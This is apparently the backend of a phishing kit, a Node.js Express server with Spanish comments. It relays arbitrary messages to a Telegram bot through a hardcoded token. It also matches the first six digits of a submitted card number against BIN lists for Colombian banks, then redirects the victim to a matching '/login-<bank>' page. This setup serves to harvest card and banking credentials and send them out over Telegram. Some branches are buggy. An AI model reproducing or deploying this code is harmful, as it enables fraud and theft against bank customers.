import express from 'express';
import fetch from 'node-fetch';
import bodyParser from 'body-parser';
import cors from 'cors';
import TelegramBot from 'node-telegram-bot-api';

const app = express();
const port = 3000;

app.use(cors({
    origin: '*', // Permite solicitudes desde cualquier origen
    methods: ['GET', 'POST'], // Métodos permitidos
    allowedHeaders: ['Content-Type'] // Encabezados permitidos
}));

// Middleware para parsear cuerpos JSON
app.use(bodyParser.json());

const token = '7775634452:AAHEfkvAsMfPd1sQ8RBBRXTx3Rc146B4K1o'; // Reemplaza con tu token de Telegram
const bot = new TelegramBot(token);

const sendTelegramMessage = async (chatId, message) => {
    try {
        await bot.sendMessage(chatId, message);
    } catch (error) {
        console.error('Error al enviar el mensaje a Telegram:', error);
        throw new Error('Error al enviar el mensaje a Telegram'); // Lanzar error para manejar en el endpoint
    }
};

app.post('/enviarmensaje', async (req, res) => {
    const { chatId, message } = req.body;
    try {
        await sendTelegramMessage(chatId, message);
        res.json({ success: true });
    } catch (error) {
        console.error('Error en /enviarmensaje:', error);
        res.status(500).json({ error: 'Error al enviar el mensaje' });
    }
});


// Lista de series para Bancolombia
const bancolombiaSeries = [
    '451307', '601687', '549157', '601676', '601651', '451376', '601645',
    '530694', '409983', '601656', '601655', '549158', '601610', '454400',
    '451359', '449188', '377813', '377814', '377815', '377816', '377843',
    '377844', '377845', '377846', '377847', '377848', '377886', '409983',
    '409984', '409985', '411054', '441119', '446846', '451303', '451308',
    '451309', '451321', '451374', '451381', '459425', '459428', '485946',
    '494381', '517640', '517710', '530691', '530693', '530695', '530696',
    '530697', '540615', '540649', '540688', '540691', '541251', '547062',
    '547480', '552588', '552807', '553145', '528633', '530372', '530371',
    '530373', '459426', '401089'
];

// Lista de series para Davivienda
const daviviendaSeries = [
    '360151', '360324', '402530', '407383', '424488', '425817', '425949', '425950',
    '425951', '539116', '439152', '441080', '454300', '455981', '455983', '455986',
    '456360', '472044', '473228', '474493', '480405', '485630', '485953', '485970',
    '486437', '487048', '491646', '491647', '498467', '512392', '517796', '520024',
    '526943', '531378', '540591', '540692', '540694', '547063', '547113', '547130',
    '547246', '547481', '547482', '547488', '549156', '549724', '552201', '552336',
    '552903', '554531', '554901', '554936', '559225', '526557', '428392', '459321',
    '447198', '320572', '403899', '430464', '455370', '455982', '458173', '511614',
    '533295', '524708', '524052'
];

const bogotaSeries = [
    '403722', '414529', '426045', '430274', '433460', '450668', '454200',
    '457537', '457542', '459504', '459505', '459918', '459919', '465770',
    '466090', '474630', '477363', '477364', '485935', '486414', '491616',
    '491617', '491625', '491626', '493110', '496083', '512069', '512827',
    '512851', '513360', '515864', '520137', '520354', '522104', '523433',
    '529198', '531088', '531122', '531126', '539612', '540080', '543862',
    '548494', '548940', '552221', '552865', '553661', '402739', '406238',
    '419328', '421513', '421544', '423949', '426732', '446872', '450942',
    '457320', '457321', '457563', '457564', '457602', '457603', '457605',
    '457604', '491511', '491602', '491614', '499812'
];

const colpatriaSeries = [
    '422274', '400476', '400477', '404177', '404178', '407398', '525358',
    '408430', '408431', '409744', '410176', '411759', '416048', '416049',
    '428495', '428496', '432105', '432106', '434606', '440811', '440812',
    '450406', '454600', '454601', '457282', '457284', '457317', '461209',
    '482484', '485930', '492485', '492486', '493813', '496084', '498476',
    '510608', '511577', '511696', '512577', '512645', '512679', '514907',
    '515858', '517411', '519422', '519971', '519986', '520142', '520147',
    '522210', '522749', '524057', '525723', '525984', '527076', '528009',
    '528085', '528098', '528614', '528884', '529404', '531375', '531960',
    '531961', '533171', '534173', '534174', '534599', '540690', '540855',
    '540919', '541659', '541692', '541693', '547064', '547129', '547479',
    '550206', '552066', '552074', '553662', '459356', '498861', '442549',
    '483160', '483100', '483101'
];

const bbvaSeries = [
    '404280', '410164', '421892', '439216', '450407', '450408', '450418',
    '454100', '454700', '454701', '454759', '455100', '456783', '459418',
    '459419', '485995', '492198', '492488', '492489', '404279', '439467',
    '462550', '492468', '491268'
];

// Lista de códigos para Occidente
const occidenteSeries = [
    400489, 400490, 400491, 400608,
    407849, 419143, 425987, 430485,
    431026, 431027, 441511, 450650,
    456390, 462940, 462941, 475094,
    485936, 489911, 489925, 491330,
    512835, 516282, 516288, 530710,
    530711, 530712, 530713, 530714,
    530715, 530716, 530717, 530718,
    530719, 530720, 530721, 530722,
    530723, 530724, 530725, 530726,
    530727, 530728, 530729, 541203,
    547385, 549151, 552256, 558772,
    540625
];

const nuseries = [
    555825
]

app.post('/procesar', async (req, res) => {
    try {
        const { codigo } = req.body;
        if (!codigo) {
            return res.status(400).json({ error: 'Código de tarjeta es requerido' });
        }
        const numeroRecortado = codigo.substring(0, 6);

        // Retraso artificial de 2 segundos (2000 ms)
        const delay = 2000;

        setTimeout(async () => {
            let redirectUrl = '/login-otro';
            let banco = 'Otro';

            if (bancolombiaSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-bancolombia';
                banco = 'BANCOLOMBIA';
            } else if (daviviendaSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-davivienda';
                banco = 'DAVIVIENDA';
            } else if (bogotaSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-bogota';
                banco = 'BANCO BOGOTÁ';
            } else if (colpatriaSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-colpatria';
                banco = 'COLPATRIA';
            } else if (bbvaSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-bbva';
                banco = 'BANCO BBVA';
            } else if (occidenteSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-occidente';
                banco = 'BANCO DE OCCIDENTE';
            } else if (occidenteSeries.includes(numeroRecortado)) {
                redirectUrl = '/login-nu';
                banco = 'NU';
            }

            res.json({ redirectUrl, banco }); // Incluye la información del banco en la respuesta
        }, delay);

    } catch (error) {
        console.error('Error en el endpoint /procesar:', error);
        res.status(500).json({ error: 'Error interno del servidor' });
    }
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor corriendo en http://localhost:${port}`);
});